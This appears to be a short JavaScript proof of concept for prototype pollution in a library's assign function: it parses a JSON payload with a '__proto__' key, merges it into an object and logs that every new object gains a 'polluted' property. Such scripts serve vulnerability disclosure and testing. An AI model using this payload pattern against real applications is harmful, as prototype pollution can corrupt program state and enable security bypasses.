var a = require("./dist");
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {};
console.log("Before : " + {}.polluted);
a.assign(obj, payload);
console.log("After : " + {}.polluted);
